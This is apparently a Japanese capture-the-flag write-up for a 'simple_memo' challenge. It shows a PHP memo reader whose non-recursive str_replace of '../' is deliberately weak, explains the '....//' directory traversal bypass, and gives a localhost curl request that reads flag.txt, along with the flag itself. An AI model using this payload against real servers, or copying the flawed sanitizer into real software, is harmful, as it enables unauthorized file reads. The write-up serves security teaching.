# simple_memo

```txt
flag.txtというファイルに私の秘密を隠したが、
完璧にサニタイズしたため辿りつける訳がない。

(Hint)
ディレクトリトラバーサルという脆弱性です。

writer : okmt
```

## Solution

問題にアクセスするとシンプルなメモが管理されています。

試しに `母の誕生日` にアクセスすると以下のようなパスでアクセスしていました。

```
http://localhost:8080/index.php?file=母の誕生日.txt
```

`file` パラメータに直接的にファイル名が指定されてアクセスしてることがわかります。

配布ファイルである `reader.php` を見てみると、サニタイジングしてる部分があります。

```php
<?php
function reader($file) {
  $memo_dir = "./memos/";

  // sanitized
  $file = str_replace('../', '', $file);
  
  $filename = $memo_dir . $file;
  $memo_exist = file_exists($filename);
  if ($memo_exist) {
    $content = file_get_contents($filename);
  } else {
    $content = "No content.";
  }
  return $content;
}
?>
```

`str_replace('../', '', $file)` の部分より、`../` が空文字列に置換されることがわかります。

これは再帰的な処理はなく、シンプルに `....//` のように入力することで真ん中の `../` が削除されて、結果 `../` だけ残って `file=../flag.txt` のようにアクセスすることができます。 

なので以下のようなパスでアクセスするとflagを得ることができます。
```shell
$ curl http://localhost:8080/index.php?file=....//flag.txt
<!DOCTYPE html>
<html lang="ja">
<head>
<title>The シンプル メモ張</title>
</head>

<body>
<div class="box"><span class="box-title">../flag.txt</span>FLAG{y0u_c4n_get_hi5_5ecret_fi1e}</div>
 ...
</html>
```

## Flag

```txt
FLAG{y0u_c4n_get_hi5_5ecret_fi1e}
```
